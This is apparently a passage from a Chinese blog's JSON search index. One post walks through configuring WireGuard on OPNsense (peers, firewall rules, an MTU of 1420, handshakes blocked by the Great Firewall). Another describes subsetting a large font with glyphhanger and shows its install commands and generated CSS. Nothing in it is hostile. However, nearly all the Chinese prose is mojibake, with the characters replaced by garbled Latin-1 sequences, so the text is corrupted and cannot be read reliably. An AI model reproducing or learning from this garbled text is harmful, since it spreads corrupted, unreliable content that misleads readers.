Assignments\nä¼šå¤šå‡ºä¸€ä¸ªinterfaceï¼Œwg0çš„ï¼ŒDescriptionå†™å¤§å†™çš„WG0ï¼Œå¿…é¡»æ˜¯è¿™ä¸ªï¼Œä¸è¦èµ·å…¶å®ƒçš„åå­—ï¼ŒWG0 \u0026ndash;\u0026gt; wg0ç›¸å‘¼åº”å¯¹ç…§ï¼Œä¸è¦ä¹±å†™\nç‚¹å‡»Add\nä¼šå˜æˆä¸‰ä¸ªå¹¶æ’ï¼Œå¦‚æœåŠ å¤šä¸ªå®ä¾‹ï¼Œå°±WG1ã€WG2è¿™ä¹ˆæ’ä¸‹å»ï¼Œä¸€ç›®äº†ç„¶\næ¥ç€å»WG0çš„interfaces\né€‰ä¸­ï¼š\nEnable æ¿€æ´»è¿™ä¸ªinterface Lock é˜»æ­¢è¿™ä¸ªinterfaceè¢«è¯¯åˆ  å…¶å®ƒéƒ½ä¿æŒç¼ºçœ ç„¶åç‚¹å‡»Saveï¼Œç„¶åApply changesï¼Œè®©é…ç½®ç”Ÿæ•ˆï¼Œå°±å¯ä»¥äº†\nå»Firewallï¼ŒRules, WG0ï¼Œä¼šçœ‹åˆ°æœ‰13æ¡ç»§æ‰¿çš„è§„åˆ™ï¼Œæˆ‘ä»¬æ–°åŠ ä¸€æ¡\næ–°åŠ å…¥çš„è§„åˆ™ï¼ŒSourceé€‰æ‹©WG0 netï¼Œè¿™æ ·10.100.100.0/24ä¼šè¢«å¸¦å…¥ï¼Œå…¶å®ƒä¿æŒç¼ºçœï¼ŒSaveå³å¯\né‚£ä¼šçœ‹åˆ°å¤šäº†ä¸€æ¡è§„åˆ™\nç„¶åæˆ‘ä»¬æ¥çœ‹çœ‹Rulesè¿˜æœ‰ä¸€ä¸ªWireGuard(Group)\nç‚¹å¼€çœ‹ï¼Œé‡Œé¢åªæœ‰ç»§æ‰¿çš„è§„åˆ™ï¼Œè€Œä¸”å†™äº†è¿™é‡Œé¢æ²¡æœ‰è§„åˆ™ï¼Œé‚£ä¹ˆæ‰€æœ‰è¿›å…¥çš„è¿æ¥éƒ½ä¼šè¢«æ‹’ç»ï¼Œç›´åˆ°é‡Œé¢æ·»åŠ äº†è§„åˆ™\nè¿™ç©æ„æ˜¯å¹²ä»€ä¹ˆç”¨çš„å‘¢ï¼Ÿ\næˆç»„é…ç½®ï¼Œæ¯”å¦‚è¯´ä½ æœ‰WG0ã€WG1ã€WG2ã€WG3è‹¥å¹²ä¸ªå®ä¾‹ï¼Œé‚£ä¹ˆç›¸åŒçš„é˜²ç«å¢™è§„åˆ™å¯ä»¥æ”¾å…¥è¿™ä¸ªGroupè§„åˆ™ä¸­ï¼Œå°±ä¸ç”¨é…å¤šæ¬¡äº†\nç”Ÿæˆæœ€ç»ˆé…ç½®çš„æ—¶å€™ï¼Œç»„é…ç½®ä¼˜å…ˆï¼Œç„¶åæ˜¯å®ä¾‹è‡ªå·±çš„å•ç‹¬é…ç½®ï¼Œç»„åˆèµ·æ¥åˆæˆæœ€ç»ˆçš„é…ç½®ï¼Œæ‰€ä»¥è™½ç„¶ç»„ç¼ºçœæ˜¯blockç­–ç•¥ï¼Œæœ€ååˆèµ·æ¥å°±ä¸æ˜¯blockäº†\næˆ‘ä»¬è¿™ä¸ªä¸ç®¡ï¼Œä¸é…ã€‚\nç„¶ååˆ°Rulesï¼ŒWANæˆ‘ä»¬éœ€è¦æ”¾è¡Œé˜²ç«å¢™\næ·»åŠ ä¸€æ¡è§„åˆ™ï¼š\nå¡«å…¥ä»¥ä¸‹å‡ é¡¹ï¼š\nProtocolï¼šUDP Destinationï¼šWAN address è¿™ä¸ªå¦‚æœä½ WANå£æœ‰å¤šä¸ªåœ°å€ï¼Œé‚£å°±éšä¾¿å“ªä¸ªéƒ½èƒ½è¿æ¥ä¸Š Destination port rangeï¼š51821 Descriptionï¼šAllow wireguard in è¿™ä¸ªå¯ä»¥ä¸å¡«ï¼Œå¡«ä¸Šæ˜¯ä¸ºäº†åˆ†æ¸…æ¥š51821æ˜¯è°å¼€çš„ ç„¶åSaveã€Applyå³å¯ã€‚\nè¿™æ ·é€šå¸¸å°±okäº†ï¼Œæˆ‘ä»¬è¿™é‡Œæœ‰ä¸ªè¶…å¸¸æƒ…å†µï¼Œé‚£å°±æ˜¯MTUï¼Œå¦‚æœä»¥ä¸Šæ­¥éª¤ï¼Œå®¢æˆ·ç«¯å¡«å…¥ä¹‹å‰æ‹·è´çš„é…ç½®èƒ½ç”¨ï¼Œå°±å®Œç»“äº†\nä¸ç”¨çœ‹ä»¥ä¸‹å†…å®¹ã€‚\næˆ‘ä»¬è¿˜ä¸è¡Œï¼Œå› ä¸ºæœºæˆ¿æ”¹äº†MTUï¼Œæ‰€ä»¥å¿…é¡»é€‚é…\næˆ‘ä»¬éœ€è¦åŠ ä¸€æ¡ï¼ŒMTU=1420æ‰å¯ä»¥\nä¸ºå•¥å‘¢ï¼ŸMTUæ­£å¸¸æ˜¯1500ã€‚\n1420 å­—èŠ‚çš„ MTU æ˜¯ WireGuard éš§é“ä¸Šä¸€ä¸ªéå¸¸å¸¸è§çš„æ¨èå€¼ï¼Œå› ä¸ºå®ƒèƒ½ç¡®ä¿åŸå§‹ 1500 å­—èŠ‚çš„ IP åŒ…åœ¨ç»è¿‡ WireGuard çš„ 80 å­—èŠ‚åŠ å¯†å’Œå¤´éƒ¨å°è£…åï¼Œä¸ä¼šåœ¨ä¼ è¾“å±‚ï¼ˆå¦‚é€šè¿‡ 1500 MTU çš„ä»¥å¤ªç½‘ï¼‰å‘ç”Ÿåˆ†ç‰‡ï¼ˆFragmentationï¼‰ã€‚\nå®Œç»“äº†ï¼Œå®Œå…¨æ²¡æœ‰é¢„æ–™åˆ°å¢™æ˜¯ç¦æ­¢å¢™å†…ç›´è¿å¢™å¤–çš„wgæœåŠ¡å™¨çš„ï¼Œæ¡æ‰‹é˜¶æ®µå°±ç›´æ¥è¿›è¡Œäº†æ‰“æ–­ã€‚æ‰€ä»¥æ¢äº†ä¸‰å°æœåŠ¡å™¨è¿˜æ˜¯ä¸è¡Œï¼Œä¸¥é‡æ€€ç–‘OPNSenseé…ç½®é”™ä¹±ï¼Œä¹‹å‰é…Nginx streamå°±æ˜¯è¿™æ ·ï¼Œç„¶åæƒ³æ¸…ç†é…ç½®ï¼Œæœ€åçš„æœ€åæ˜¯æ‰¾äº†ä¸€å°æ–°åŠ æŠ«çš„æœåŠ¡å™¨ï¼Œä¸€æµ‹å°±é€šäº†ï¼\näºæ˜¯ï¼Œé¥è¿œçš„ä¸œæ–¹ï¼Œå¢™é¥é¥é¢†å…ˆã€‚\n","permalink":"https://rendoumi.com/posts/20251217-opnsense_wireguard/","summary":"\u003cp\u003eå±…ç„¶èŠ±äº†ä¸€æ™šä¸Šå’Œä¸€æ•´å¤©çš„æ—¶é—´æ¥é…ç½®è¿™ä¸ªï¼ŒçœŸçš„æ˜¯å¤§å‡ºæ‰€æ–™ï¼Œåœ¨æœ€æµ…æ˜¾çš„åœ°æ–¹æ ½äº†æœ€å¤§çš„è·Ÿå¤´\u003c/p\u003e\n\u003cp\u003eå› ä¸ºä¹‹å‰é…ç½®çš„æ—¶å€™éƒ½å¤ªç—›å¿«äº†ï¼Œ5åˆ†é’Ÿï¼Œç„¶åæ”¾è·¯ç”±ï¼Œå°±okäº†ï¼Œç»“æœè¿™æ¬¡å°±ç»“ç»“å®å®ç¿»è½¦äº†ï¼\u003c/p\u003e\n\u003cp\u003eå…ˆè¯´æœ€å¤§çš„åŸå› ï¼šå¢™ï¼Œæ— è§†å¢™çš„å­˜åœ¨ï¼Œå¿…ç„¶è¢«å¢™åå™¬ï¼Œæœ¬æ¥ç®€å•çš„äº‹æƒ…ä¹Ÿå˜å¾—å¤æ‚ã€‚\u003c/p\u003e\n\u003cp\u003eæ³¨æ„äº‹é¡¹ï¼Œæ™®é€šé…å…¶å®å¾ˆç®€å•ï¼Œä½†æ˜¯å‡ºä¹æ„æ–™çš„è¿˜æœ‰MTUç­‰ç€ä½ ï¼Œå› ä¸ºVPSè¢«å¼ºåˆ¶æ”¹äº†MTUï¼Œæ‰€ä»¥è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå‘ï¼Œæ™®é€šçš„ä¸ä¼šé‡åˆ°è¿™ä¸ªæƒ…å†µã€‚\u003c/p\u003e\n\u003cp\u003eè®°å½•ä¸€ä¸‹è¿‡ç¨‹ï¼š\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆï¼ŒOPNSenseè€ç‰ˆæœ¬çš„éœ€è¦å®‰è£…æ’ä»¶os-wireguardï¼Œä½†æ–°ç‰ˆæœ¬å·²ç»å†…ç½®wireguardäº†ï¼Œå®Œå…¨ä¸ç”¨å®‰è£…\u003c/p\u003e\n\u003cp\u003eå·¦è¾¹æ çœ‹ä¸€ä¸‹ï¼Œæœ‰å°±OKï¼Œä¸ç”¨å®‰è£…\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217140635467\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217140635467.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åæˆ‘ä»¬å…ˆå»WireGuardçš„Instancesï¼Œåˆå§‹æ˜¯ç©ºç™½çš„ï¼Œé‚£å°±æŒ‰+å·æ·»åŠ ä¸€ä¸ªæ–°çš„å®ä¾‹\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217140952967\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217140952967.png\"\u003e\u003c/p\u003e\n\u003cp\u003eéœ€è¦å¡«å†™ä»¥ä¸‹å‡ é¡¹\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217141111022\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217141111022.png\"\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eNameï¼šWG-LC\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eInstanceæ˜¯0ï¼Œè¡¨ç¤ºè¿™ä¸ªå®ä¾‹ä¼šæ˜¯wg0è¿™ä¸ªç½‘å¡\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eæŒ‰é½¿è½®Genå‡ºseverçš„ Public keyå’ŒPrivate key\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eLIsten portï¼š51821 é‡‡ç”¨éæ ‡ç«¯å£ï¼Œæ˜¯UDPç±»å‹çš„ç«¯å£\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eTunnel addressï¼šè¡¨æ˜wg0ç½‘å¡æ‰€åœ¨çš„ç½‘æ®µï¼Œ10.100.100.1æ˜¯æœåŠ¡å™¨çš„åœ°å€\u003c/p\u003e\n\u003cp\u003eç„¶åå¡«å®Œç‚¹å‡»Saveå°±OKäº†\u003c/p\u003e\n\u003cp\u003eè¿”å›åï¼Œé€‰ä¸­Enable WireGuardï¼Œç„¶åApplyï¼Œå°±ä¼šå¯åŠ¨æœåŠ¡äº†ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217141311489\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217141311489.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eæ¥ç€å»genå®¢æˆ·ç«¯é…ç½®ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217141608725\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217141608725.png\"\u003e\u003c/p\u003e\n\u003cp\u003eåˆ° Peer generatorï¼Œå¡«å…¥ä»¥ä¸‹å†…å®¹\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eNameï¼šå®¢æˆ·ç«¯åç§°ï¼Œèµ·ä¸ªZRRï¼Œå¥½è®¤\u003c/li\u003e\n\u003cli\u003eAddressï¼šä¼šè‡ªåŠ¨æŒ‰åºåˆ—ç”Ÿæˆï¼Œè¿™é‡Œæ˜¯10.100.100.2/32\u003c/li\u003e\n\u003cli\u003eAllowed IPsï¼šè¿™é‡Œéå¸¸å…³é”®ï¼Œä¸€å®šä¸èƒ½å¡«0.0.0.0ï¼Œé‚£ç›¸å½“äºæ‰€æœ‰è·¯ç”±éƒ½èµ°è¿™ä¸ªwgéš§é“äº†ï¼Œæ‰€ä»¥ä¸€å®šè¦æŒ‡å®šè‡ªå·±è¦èµ°çš„è·¯ç”±ï¼Œé¦–å…ˆæ˜¯wg0çš„ç½‘æ®µ10.100.100.0/24ï¼Œç„¶åæ˜¯å†…ç½‘çš„192.168.99.0/24\u003c/li\u003e\n\u003cli\u003eç„¶åä¸€å®šè¦æŠŠConfigçš„é…ç½®ç»™æ‹·è´å‡ºæ¥å¤‡ç”¨\u003c/li\u003e\n\u003cli\u003eæœ€åç‚¹å‡» Store and generate nexeçš„æŒ‰é’®ï¼Œä¸è¦ç‚¹Applyé‚£ä¸ª\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eç„¶åå°±OKäº†ï¼Œå›åˆ° Peers é¡µçœ‹çœ‹ï¼Œå¤šäº†ä¸€ä¸ªZRRçš„å¯¹ç«¯ï¼Œå°±æ²¡é—®é¢˜\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217142110721\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217142110721.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç»§ç»­ï¼Œéœ€è¦é…ç½®æ¥å£å’Œé˜²ç«å¢™è§„åˆ™\u003c/p\u003e\n\u003cp\u003eå·¦è¾¹æ ï¼ŒInterfaces \u0026ndash;\u0026gt; Assignments\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217142807893\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217142807893.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¼šå¤šå‡ºä¸€ä¸ªinterfaceï¼Œwg0çš„ï¼ŒDescriptionå†™å¤§å†™çš„WG0ï¼Œå¿…é¡»æ˜¯è¿™ä¸ªï¼Œä¸è¦èµ·å…¶å®ƒçš„åå­—ï¼ŒWG0 \u0026ndash;\u0026gt; wg0ç›¸å‘¼åº”å¯¹ç…§ï¼Œä¸è¦ä¹±å†™\u003c/p\u003e\n\u003cp\u003eç‚¹å‡»Add\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217142908316\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217142908316.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¼šå˜æˆä¸‰ä¸ªå¹¶æ’ï¼Œå¦‚æœåŠ å¤šä¸ªå®ä¾‹ï¼Œå°±WG1ã€WG2è¿™ä¹ˆæ’ä¸‹å»ï¼Œä¸€ç›®äº†ç„¶\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217143151970\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217143151970.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæ¥ç€å»WG0çš„interfaces\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217143824101\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217143824101.png\"\u003e\u003c/p\u003e\n\u003cp\u003eé€‰ä¸­ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eEnable æ¿€æ´»è¿™ä¸ªinterface\u003c/li\u003e\n\u003cli\u003eLock é˜»æ­¢è¿™ä¸ªinterfaceè¢«è¯¯åˆ \u003c/li\u003e\n\u003cli\u003eå…¶å®ƒéƒ½ä¿æŒç¼ºçœ\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251217144020653\" loading=\"lazy\" src=\"/posts/20251217-opnsense_wireguard/image-20251217144020653.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åç‚¹å‡»Saveï¼Œç„¶åApply changesï¼Œè®©é…ç½®ç”Ÿæ•ˆï¼Œå°±å¯ä»¥äº†\u003c/p\u003e\n\u003cp\u003eå»Firewallï¼ŒRules, WG0ï¼Œä¼šçœ‹åˆ°æœ‰13æ¡ç»§æ‰¿çš„è§„åˆ™ï¼Œæˆ‘ä»¬æ–°åŠ ä¸€æ¡\u003c/p\u003e","title":"OPNSenseé…ç½®é…ç½®wireguard"},{"content":"ä¸å¾—ä¸æ„Ÿå¹ï¼Œaiæ—¶ä»£çš„å¼ºå¤§ï¼Œåšä¸»çš„æœ¬èŒæ˜¯ä¸€ä¸ªè¿ç»´ï¼Œå¯¹å‰ç«¯å’ŒCSSæ‡‚çš„ä¸å¤šï¼Œç”¨çš„è½¯ä»¶æ˜¯Hugoï¼Œå…¶å®å¯¹è¿™ä¸ªä¹Ÿä¸€çªä¸é€šï¼Œå°±æ˜¯é€‰äº†ä¸€ä¸ªè‡ªå·±çœ‹å¾—é¡ºçœ¼çš„themeï¼Œç„¶åå°±æ˜¯ç”¨æ¥å†™æ–‡ç« ï¼ŒæœŸé—´ä¹Ÿå°è¯•å»åšäº›æ”¹å˜ï¼Œå‡å·²å¤±è´¥å‘Šç»ˆï¼Œä¸»è¦æ˜¯å¯¹hugoã€themeã€cssä¸æ¸…æ¥šï¼Œä¹Ÿä¸çŸ¥é“æ€ä¹ˆæ”¹ã€‚\nç°åœ¨æœ‰äº†AIçš„åŠ æŒï¼Œè¿™ä¸ªä¸€ç›´ç”¨äº†å¥½å¤šå¹´çš„blogçš„æ ·å­ä¹Ÿçœ‹çƒ¦äº†ï¼Œå‡†å¤‡æ¢æ‰ã€‚\næ—§çš„ç•Œé¢ï¼š\næ–°çš„ç•Œé¢ï¼š\nç”¨äº†geminiï¼ŒèŠ±äº†ä¸€å¤©æ—¶é—´ï¼Œä¸»è¦æ˜¯å«Œå¼ƒåº•éƒ¨çš„å‰ä¸€é¡µã€åä¸€é¡µçœ‹èµ·æ¥æ°¸æ— æ­¢å¢ƒï¼Œäºæ˜¯è®©aiæ“äº†ä¸€ä¸ªåº•éƒ¨å¯¼èˆªæ¡ã€‚ä¹Ÿå®šåˆ¶äº†cssã€‚ç¡®å®æƒŠè‰³ä¸€æª\nä½†æ˜¯è¿‡ç¨‹ä¸­å§ï¼Œç”¨åˆ°äº†ä¸€ä¸ªå¼€æºçš„å­—ä½“ï¼šOPPOSans-Regular.ttf ï¼ŒOPPOæ‰‹æœºçš„å­—ä½“ï¼Œè¿™ä¸ªæ–‡ä»¶å±…ç„¶æœ‰9å…†ä¹‹å·¨\nå®ŒçŠŠå­äº†ï¼ŒåŠ è½½å­—ä½“éƒ½è¦èŠ±åŠå¤©æ—¶é—´ï¼Œè¿™ä¹Ÿå¤ªææ€–äº†ï¼Œäºæ˜¯æœä¼˜åŒ–æ–¹æ¡ˆ\né‚£å°±æ˜¯å‹ç¼©å­—ä½“ï¼ŒæŠŠåšå®¢ä¸­å‡ºç°çš„æ‰€æœ‰å­—æ‰«æä¸€éï¼Œç„¶åç”Ÿæˆå°å­—ä½“æ–‡ä»¶ï¼Œè¿™æ ·å°±å¥½äº†\né‚£å°±è¦ç”¨åˆ° glyphhanger äº†\næ³¨æ„ï¼šè¿™ä¸ªè½¯ä»¶ç”¨èµ·æ¥åŠå…¶éº»çƒ¦ï¼Œä¸€å®šè¦åœ¨Windowsä¸‹è£…ï¼ŒLinuxä¸‹ç®€ç›´æ˜¯åƒåœ¾æˆå †\næœ¬ä½“æ˜¯ä¸€ä¸ªnodejsçš„è½¯ä»¶ï¼Œç”¨åˆ°äº†pythonçš„fonttoolsï¼Œè¿˜è£…äº†puppyteerè¿›è¡Œç½‘é¡µçš„æŠ“å–ï¼Œç®€ç›´æ˜¯æ‚çƒ©å¤§é›†åˆ\n# è¦å‹ç¼©æˆwoff2ï¼Œæ‰€ä»¥è¦è£…pythonçš„2ä¸ªåŒ… npm install -g glyphhanger pip install fonttools pip install brotli #æ‰“å¼€hugoçš„é¢„è§ˆï¼Œhttp://localhost:1313/ hugo serve # å½“å‰ç›®å½•ä¸‹çš„OPPOSans-Regular.ttfï¼Œç”Ÿæˆå‹ç¼©è¿‡çš„å­—ä½“æ–‡ä»¶ï¼Œæ ¼å¼æ˜¯woff2 glyphhanger --subset OPPOSans-Regular.ttf --formats=woff2 --output ./ http://localhost:1313/posts/ ttfçš„å®Œæ•´å­—ä½“ç»è¿‡å‹ç¼©æˆwoff2ï¼Œä»9å…†å˜æˆäº†4.52å…†ï¼Œç„¶åæ‰«æç½‘é¡µååˆå‹ç¼©åˆ°äº†æœ€ç»ˆçš„75.5KB.\nè¿™ä¼šç”Ÿæˆä¸€ä¸ªOPPOSans-Regular-subset.woff2çš„æ–°å­—ä½“æ–‡ä»¶ï¼Œ75.5KB\næ²¡å®Œå‘¢ï¼Œæˆ‘ä»¬è¿˜è¦åœ¨CSSé‡ŒæŒ‡å®šå­—ä½“èŒƒå›´\n# å‹ç¼©å­—ä½“æ–‡ä»¶ï¼ŒåŒæ—¶ç”ŸæˆCSSæ ·å¼ glyphhanger --css --subset fonts/OPPOSans-Regular.woff2 --formats=woff2 --output newfonts http://localhost:1313/posts/ ä¼šç”ŸæˆCSSæ–‡ä»¶ï¼Œæˆ‘ä»¬æŠŠå®ƒæ”¾è¿›å®šåˆ¶çš„custom.cssä¸­å³å¯\n@font-face { font-family: OPPO Sans; src: local(\u0026#34;OPPO Sans\u0026#34;), url(OPPOSans-Regular-subset.woff2) format(\u0026#34;woff2\u0026#34;); unicode-range: U+A,U+20-3E,U+40-7D,U+A9,U+B7,U+BB,U+2013,U+25BA,U+2705,U+3001,U+3002,U+4E00,U+4E09-4E0B,U+4E0D,U+4E14,U+4E1A,U+4E1C,U+4E24,U+4E2A,U+4E2D,U+4E34,U+4E3A,U+4E3B,U+4E48,U+4E49,U+4E4B,U+4E4E,U+4E50,U+4E5F,U+4E66,U+4E71,U+4E86,U+4E89,U+4E8B,U+4E8C,U+4E8E,U+4E94,U+4E9B,U+4EA6,U+4EA7,U+4EAB,U+4EBA,U+4ECA,U+4ECE,U+4ED3,U+4EE3-4EE5,U+4EEC,U+4EF6,U+4EFB,U+4EFD,U+4F01,U+4F1A,U+4F20,U+4F3C,U+4F46,U+4F53,U+4F55,U+4F59,U+4F5C,U+4F60,U+4F73,U+4F7F,U+4FBF,U+4FDD,U+4FE1,U+4FEE,U+5019,U+503C,U+5047,U+504F,U+505A,U+50CF,U+513F,U+5143,U+5148,U+5165,U+5168,U+516B,U+516C,U+5171,U+5173,U+5176,U+5177,U+517C,U+5185,U+518D,U+5197,U+5199,U+51B3,U+51B5,U+51C0,U+51C6,U+51FA,U+51FB,U+51FD,U+5206,U+5212,U+5219-521B,U+521D,U+5220,U+522B,U+5230,U+524D,U+526F,U+529E-52A1,U+52A8,U+52B2,U+5305,U+5316,U+5355,U+535A,U+5360,U+5361,U+5373,U+5386,U+53BB,U+53C2,U+53C8,U+53CA,U+53D1,U+53D6,U+53D8,U+53E3,U+53E4,U+53EA,U+53EF,U+53F0,U+53F7,U+53F8,U+5404,U+540C-540E,U+5411,U+5426,U+5427,U+542F,U+544A,U+5462,U+547D,U+548C,U+54EA,U+554A,U+5565,U+5668,U+56DB,U+56DE,U+56E0,U+56E7,U+56FD,U+56FE,U+5728,U+5730,U+573A,U+5740,U+5757,U+578B,U+57DF,U+585E,U+5883,U+589E,U+5904,U+5907,U+590D,U+5916,U+591A,U+5927,U+5929,U+592A,U+5931,U+5948,U+597D,U+5982,U+59CB,U+5B50,U+5B57,U+5B58,U+5B83,U+5B89,U+5B8C,U+5B98,U+5B9A,U+5B9E,U+5BA2,U+5BB6,U+5BB9,U+5BBD,U+5BC6,U+5BCC,U+5BF9,U+5BFC,U+5C01,U+5C06,U+5C31,U+5C3D,U+5C45,U+5DDE,U+5DF1,U+5DF2,U+5E02,U+5E03,U+5E38,U+5E72-5E74,U+5E76,U+5E78,U+5E7F,U+5E8F,U+5E93,U+5E94,U+5EFA,U+5F00,U+5F04,U+5F0F,U+5F20,U+5F31,U+5F39,U+5F52,U+5F53,U+5F55,U+5F85,U+5F88,U+5F97,U+5FAA,U+5FC3,U+5FC5,U+5FD7,U+5FEB,U+6000,U+6001,U+600E,U+601D,U+6027,U+603B,U+6062,U+606F,U+6089,U+60A8,U+60C5,U+60F3,U+6109,U+610F,U+613F,U+6210-6212,U+6216,U+6237,U+623F,U+6240,U+624B,U+624D,U+6253,U+6254,U+6258,U+6267,U+6269,U+627E,U+6280,U+628A,U+62A5,U+62C9,U+62DF,U+62E9,U+62EC,U+62FF,U+6301,U+6307,U+6309,U+636E,U+6377,U+6389,U+6392,U+63A5,U+63A8,U+641C,U+642D,U+6446,U+6447,U+64CD,U+652F,U+6539,U+653E,U+6545,U+6570,U+6574,U+6587,U+65AD,U+65B0,U+65B9,U+65E0,U+65E5,U+65E9,U+65F6,U+660E,U+6613,U+662F,U+663E,U+666F,U+66B4,U+66F4,U+6700,U+6708,U+6709,U+670D,U+671F,U+672A,U+672C,U+672F,U+673A,U+6743,U+6765,U+677E,U+677F,U+6790,U+679C,U+67D0,U+67E5,U+6807,U+6837-6839,U+683C,U+6848,U+6863,U+68AD,U+68C0,U+6A21,U+6B21,U+6B4C,U+6B62,U+6B63,U+6B65,U+6B7B,U+6BB5,U+6BCF,U+6BD4,U+6C42,U+6C89,U+6CA1,U+6CD5,U+6CE8,U+6D3B,U+6D4B,U+6D88,U+6DFB,U+6E05,U+6E90,U+6EE5,U+6F0F,U+706B,U+70B9,U+70C2,U+70E6,U+7130,U+7136,U+7167,U+719F,U+723D,U+7248,U+7279,U+72B6,U+72EC,U+73A9,U+73AF,U+73B0,U+7406,U+751F,U+7528,U+7531,U+754C,U+7591,U+7684,U+76D6,U+76EE,U+76F4,U+76F8,U+7701,U+770B,U+771F,U+77E5,U+77ED,U+7801,U+7814,U+786E,U+793A,U+79BB,U+79CD,U+79D2,U+79DF,U+79F0,U+79FB,U+7A00,U+7A0B,U+7A76,U+7A7A,U+7ACB,U+7AD9,U+7ADE-7AE0,U+7AEF,U+7B2C,U+7B49,U+7B54,U+7B7E,U+7B80,U+7B97,U+7BA1,U+7C7B,U+7CFB,U+7D22,U+7E41,U+7EA7,U+7EAF,U+7EC6,U+7ECF,U+7ED3,U+7ED9,U+7EDC,U+7EDF,U+7EED,U+7F3A,U+7F51,U+7F6E,U+7F72,U+7FA4,U+8003,U+8005,U+800C,U+800D,U+8017,U+804C,U+8054,U+80AF,U+80CC,U+80FD,U+8106,U+8111,U+811A,U+817E,U+81EA,U+81F4,U+8272,U+8282,U+8350,U+83B7,U+83DC,U+85CF,U+8651,U+865A,U+884C,U+88AB,U+88C2,U+88C5,U+88D5,U+897F,U+8981,U+8986,U+89C9,U+89D2,U+89E3,U+8A00,U+8B66,U+8BA1,U+8BA2,U+8BAF,U+8BB2,U+8BBA,U+8BBE,U+8BBF,U+8BC1,U+8BD5,U+8BDD,U+8BE2,U+8BE5,U+8BE6,U+8BED,U+8BEF,U+8BF4,U+8BF7,U+8C03,U+8C37,U+8C61,U+8D25,U+8D44,U+8D70,U+8D77,U+8DD1,U+8DDF,U+8DEF,U+8DF3,U+8DF5,U+8F7B,U+8F7D,U+8F83,U+8F93,U+8FC1,U+8FC7,U+8FD0,U+8FD4,U+8FD8,U+8FD9,U+8FDB,U+8FDE,U+9000-9002,U+9009,U+901A,U+903C,U+9047,U+904D,U+9053,U+9075,U+90A3,U+90E8,U+90FD,U+914D,U+91CA,U+91CC,U+91CD,U+91CF,U+94FE,U+9501,U+9519,U+952E,U+955C,U+957F,U+95EE,U+95F4,U+9632,U+963B,U+9645,U+964B,U+9650,U+9664,U+968F,U+9690,U+969C,U+96BE,U+96C6,U+9700,U+975E,U+9762,U+9875,U+9876,U+987B,U+9884,U+9891,U+9898,U+9996,U+9AA4,U+9AD8,U+9EBB,U+FF01,U+FF0C,U+FF1A,U+FF1F; font-style: normal; font-display: swap; font-weight: 300 700; } æŠŠå‹ç¼©åçš„å­—ä½“å’ŒCSSå†æ¬¡æäº¤ååšå®¢çš„é€Ÿåº¦å°±å˜å¾—é£å¿«äº†ã€‚\nä¼¼ä¹æœ‰ç‚¹ä¸åŠ¡æ­£ä¸šäº†ï¼Œæ„Ÿæ…¨ï¼ŒAIå§”å®è¦è®©å‰ç«¯è¦ç­äº¡äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20251213-blog_renew/","summary":"\u003cp\u003eä¸å¾—ä¸æ„Ÿå¹ï¼Œaiæ—¶ä»£çš„å¼ºå¤§ï¼Œåšä¸»çš„æœ¬èŒæ˜¯ä¸€ä¸ªè¿ç»´ï¼Œå¯¹å‰ç«¯å’ŒCSSæ‡‚çš„ä¸å¤šï¼Œç”¨çš„è½¯ä»¶æ˜¯Hugoï¼Œå…¶å®å¯¹è¿™ä¸ªä¹Ÿä¸€çªä¸é€šï¼Œå°±æ˜¯é€‰äº†ä¸€ä¸ªè‡ªå·±çœ‹å¾—é¡ºçœ¼çš„themeï¼Œç„¶åå°±æ˜¯ç”¨æ¥å†™æ–‡ç« ï¼ŒæœŸé—´ä¹Ÿå°è¯•å»åšäº›æ”¹å˜ï¼Œå‡å·²å¤±è´¥å‘Šç»ˆï¼Œä¸»è¦æ˜¯å¯¹hugoã€themeã€cssä¸æ¸…æ¥šï¼Œä¹Ÿä¸çŸ¥é“æ€ä¹ˆæ”¹ã€‚\u003c/p\u003e\n\u003cp\u003eç°åœ¨æœ‰äº†AIçš„åŠ æŒï¼Œè¿™ä¸ªä¸€ç›´ç”¨äº†å¥½å¤šå¹´çš„blogçš„æ 